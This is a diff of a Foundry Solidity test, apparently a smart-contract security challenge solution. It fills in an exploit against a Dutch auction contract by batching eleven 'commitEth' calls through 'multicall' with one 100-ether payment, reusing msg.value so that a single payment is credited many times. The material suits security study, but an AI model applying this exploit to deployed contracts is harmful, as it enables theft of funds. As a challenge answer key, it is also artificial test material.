@@ -60,7 +60,17 @@ contract Testing is Test {
     function testChallengeExploit() public {
         vm.startPrank(attacker, attacker);
 
-        // implement solution here
+        // uint256 commitment = dutchAuction.calculateCommitment(200e18);
+        // console.log(commitment);
+
+        bytes memory callFunction = abi.encodeWithSelector(dutchAuction.commitEth.selector, attacker);
+        bytes[] memory data = new bytes[](11);
+
+        for (uint256 i; i < 11; i++) {
+            data[i] = callFunction;
+        }
+
+        dutchAuction.multicall{value: 100e18}(data);
 
         vm.stopPrank();
         validation();
